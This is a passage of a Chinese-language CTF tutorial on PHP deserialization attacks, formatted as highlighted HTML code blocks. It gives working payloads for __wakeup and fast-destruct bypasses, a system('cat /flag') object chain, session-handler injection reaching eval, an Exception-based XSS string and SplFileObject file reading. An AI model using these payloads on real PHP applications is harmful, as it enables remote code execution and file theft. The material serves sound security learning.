+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#6A737D">// 加号绕过</span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#F97583">+</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Test"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;}</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D">// 数组绕过</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D">// echo serialize(array(new Test()));</span></span>
+<span class="line" data-line="5"><span style="color:#B392F0">a</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">i</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Test"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">8</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"username"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;}}</span></span></code></pre>
+<h4 id="引用绕过">引用绕过</h4>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> test</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $a;</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $b;</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> uniqid</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">a </span><span style="color:#F97583">===</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">b) {</span></span>
+<span class="line" data-line="10"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> 'Success'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'data'</span><span style="color:#E1E4E8">]);</span></span></code></pre>
+<p>像这种，我们直接通过引用变量的方式进行绕过即可</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">b </span><span style="color:#F97583">=</span><span style="color:#F97583"> &#x26;</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">a;</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">// O:4:"test":2:{s:1:"a";N;s:1:"b";R:2;}</span></span></code></pre>
+<h4 id="绕过异常-throw-new-error">绕过异常 throw new Error()</h4>
+<p><code>throw</code> 的作用会阻断 <code>__destruct()</code> 的执行，例题可以参考 <a href="https://5ime.cn/ccsec-2023.html#pop">贵阳大数据及网络安全精英对抗赛 2023 POP</a> 一题</p>
+<p>参考：<a href="https://www.wangan.com/p/7fy7f46cd2c8727f#fastdestruct%E6%8F%90%E5%89%8D%E8%A7%A6%E5%8F%91%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">fast destruct 提前触发魔术方法</a></p>
+<p>本质上，<code>fast destruct</code> 是因为 <code>unserialize</code> 过程中扫描器发现序列化字符串格式有误导致的提前异常退出，为了销毁之前建立的对象内存空间，会立刻调用对象的 <code>__destruct()</code>, 提前触发反序列化链条。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"TT"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"key"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"JJ"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"obj"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"MM"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"system"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"cat /flag"</span><span style="color:#E1E4E8">;}}</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p>去掉序列化尾部 <code>}</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"TT"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"key"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"JJ"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"obj"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"MM"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">6</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"system"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"cat /flag"</span><span style="color:#E1E4E8">;}}</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"c"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">N</span></span></code></pre>
+<h3 id="极客大挑战-2019-php">[极客大挑战 2019] PHP</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">include</span><span style="color:#9ECBFF"> 'flag.php'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">error_reporting</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">class</span><span style="color:#B392F0"> Name</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'nonono'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'yesyes'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($username,$password){</span></span>
+<span class="line" data-line="8"><span style="color:#6A737D">    // 在创建对象时候初始化对象，一般用于对变量赋初值。</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="10"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">password </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="12"><span style="color:#F97583">    function</span><span style="color:#79B8FF"> __wakeup</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="13"><span style="color:#6A737D">    // 反序列化恢复对象之前调用该方法</span></span>
+<span class="line" data-line="14"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'guest'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="16"><span style="color:#F97583">    function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">(){</span></span>
+<span class="line" data-line="17"><span style="color:#6A737D">    // 当对象所在函数调用完毕后执行</span></span>
+<span class="line" data-line="18"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">password </span><span style="color:#F97583">!=</span><span style="color:#79B8FF"> 100</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="19"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "&#x3C;/br>NO!!!hacker!!!&#x3C;/br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="20"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "You name is: "</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="21"><span style="color:#79B8FF">            echo</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username;</span><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "&#x3C;/br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="22"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "You password is: "</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="23"><span style="color:#79B8FF">            echo</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">password;</span><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> "&#x3C;/br>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="24"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="25"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="26"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">===</span><span style="color:#9ECBFF"> 'admin'</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">            global</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="28"><span style="color:#79B8FF">            echo</span><span style="color:#E1E4E8"> $flag;</span></span>
+<span class="line" data-line="29"><span style="color:#E1E4E8">        }</span><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="30"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "&#x3C;/br>hello my friend~~&#x3C;/br>sorry i can't give you the flag!"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="31"><span style="color:#F97583">            die</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="32"><span style="color:#E1E4E8">        }</span></span>
+<span class="line" data-line="33"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="35"><span style="color:#F97583">?></span></span></code></pre>
+<p>代码逻辑就是如果密码等于 <code>100</code> 同时用户名等于 <code>admin</code> ，执行 <code>__construct</code> 的时候输出 <code>flag</code>。 直接构建反序列化</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> Name</span><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $username </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'nonono'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    private</span><span style="color:#E1E4E8"> $password </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'yesyes'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($username,$password){</span></span>
+<span class="line" data-line="7"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">username </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $username;</span></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">password </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $password;</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">$flag </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> Name</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'admin'</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="12"><span style="color:#79B8FF">echo</span><span style="color:#79B8FF"> serialize</span><span style="color:#E1E4E8">($flag);</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#6A737D">// O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</span></span></code></pre>
+<p>就目前来看我们已经把 <code>__construct</code> 和 <code>__destruct</code> 绕过去了，但是 <code>__wakeup</code> 会把我们的 <code>username</code> 重新赋值为 <code>guest</code> ，我们直接用上面提到的 <code>__wakeup</code> 绕过方法，把 <code>"Name":2</code> 改为 <code>"Name":3</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Name"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Nameusername"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Namepassword"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">i</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p>但我们这里访问控制是私有 <code>Private</code> ，所以我们需要在类名和成员名之前加上 <code>%00</code> ，达到绕过目的。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">O</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"Name"</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"%00Name%00username"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">5</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"admin"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">14</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"%00Name%00password"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">i</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">100</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<h2 id="session-反序列化">Session 反序列化</h2>
+<p>PHP在 <code>session</code> 存储和读取时,都会有一个序列化和反序列化的过程，PHP内置了多种处理器用于存取 <code>$_SESSION</code> 数据，都会对数据进行序列化和反序列化</p>
+<p>在 <code>php.ini</code> 中通常存在以下配置项：</p>
+<ul>
+<li><code>session.save_path</code>  设置session的存储路径</li>
+<li><code>session.save_handler</code>  设定用户自定义存储函数</li>
+<li><code>session.auto_start</code>  指定会话模块是否在请求开始时启动一个会话</li>
+<li><code>session.serialize_handler</code>  定义用来序列化/反序列化的处理器名字。默认使用 <code>php</code></li>
+</ul>
+<h3 id="存储引擎">存储引擎</h3>
+<p>不同的引擎所对应的 <code>session</code> 的存储方式不相同。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">ini_set</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'session.serialize_handler'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'php'</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D">// ini_set("session.serialize_handler", "php_serialize");</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D">// ini_set("session.serialize_handler", "php_binary");</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">session_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">$_SESSION[</span><span style="color:#9ECBFF">'name'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'iami233'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="8"><span style="color:#79B8FF">var_dump</span><span style="color:#E1E4E8">($_SESSION);</span></span></code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>引擎</th><th>存储方式</th><th>示例</th></tr></thead><tbody><tr><td>php</td><td><code>键名</code> + <code>竖线</code> + 经过 <code>serialize()</code> 函数序列化处理的值</td><td>`name</td></tr><tr><td>php_binary</td><td>键名的长度对应的 <code>ASCII</code> 字符 + <code>键名</code> + 经过 <code>serialize()</code> 函数序列化处理的值</td><td><code>names:7:"iami233";</code></td></tr><tr><td>php_serialize</td><td>经过 <code>serialize()</code> 函数序列化处理的数组</td><td><code>a:1:{s:4:"name";s:7:"iami233";}</code></td></tr></tbody></table>
+<h3 id="举个例子-1">举个例子</h3>
+<p>我们新建一个 <code>1.php</code> 文件，使用 <code>php_serialize</code> 引擎</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">ini_set</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"session.serialize_handler"</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">"php_serialize"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"></span>
+<span class="line" data-line="4"><span style="color:#79B8FF">session_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">$_SESSION[</span><span style="color:#9ECBFF">'name'</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> '|O:4:"Name":1:{s:3:"rce";s:10:"phpinfo();";}'</span><span style="color:#E1E4E8">;</span></span></code></pre>
+<p>访问 <code>localhost/1.php</code> 后生成的 <code>session</code> 文件内容文件为：</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">a</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">:{</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">4</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"name"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">s</span><span style="color:#E1E4E8">:</span><span style="color:#79B8FF">44</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"|O:4:"</span><span style="color:#79B8FF">Name</span><span style="color:#9ECBFF">":1:{s:3:"</span><span style="color:#79B8FF">rce</span><span style="color:#9ECBFF">";s:10:"</span><span style="color:#79B8FF">phpinfo</span><span style="color:#E1E4E8">();</span><span style="color:#9ECBFF">";}"</span><span style="color:#E1E4E8">;}</span></span></code></pre>
+<p><code>php</code> 序列化引擎以 <code>|</code> 作为 <code>key</code> 和 <code>value</code> 的分隔符，只反序列化 <code>|</code> 后面的内容 所以我们需要在前面加个 <code>|</code>，这样 <code>a:1:{s:4:"name";s:44:"</code> 被当做了 <code>key</code> ，而 <code>O:4:"Name":1:{s:3:"rce";s:10:"phpinfo();";}";}</code> 被当做了 <code>value</code></p>
+<p>再新建一个 <code>2.php</code> 文件，不声明引擎的话，默认是 <code>php</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#79B8FF">session_start</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">class</span><span style="color:#B392F0"> Name</span><span style="color:#E1E4E8"> {</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $rce; </span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    function</span><span style="color:#79B8FF"> __destruct</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">         eval</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">rce);</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">?></span></span></code></pre>
+<p>此时访问 <code>localhost/2.php</code> 即可执行 <code>phpinfo()</code> 函数</p>
+<h2 id="原生类-反序列化">原生类 反序列化</h2>
+<p>比较常见的为 <code>SoapClient()</code> 类，不过这里也记录一下其他见过的原生类</p>
+<h3 id="errorexception-xss">Error/Exception XSS</h3>
+<p><code>Error</code> 类是在 <code>php7</code> 下存在的一个内置类，是所有PHP内部错误类的基类。<code>Error</code> 类中存在 <code>__toString()</code>，当把对象当成字符串的时候它就会自动调用这个方法，而它会将 <code>Error</code> 以字符串的形式表达出来</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> serialize</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">new</span><span style="color:#79B8FF"> Exception</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"&#x3C;script>alert(1)&#x3C;/script>"</span><span style="color:#E1E4E8">));</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $a;</span></span></code></pre>
+<p>Tips： <code>Exception</code> 原理一致，但其在 <code>php5</code> 中也能使用</p>
+<h3 id="splfileobject-读文件">SplFileObject 读文件</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$a </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> SplFileObject</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"flag.txt"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $a;</span></span></code></pre>
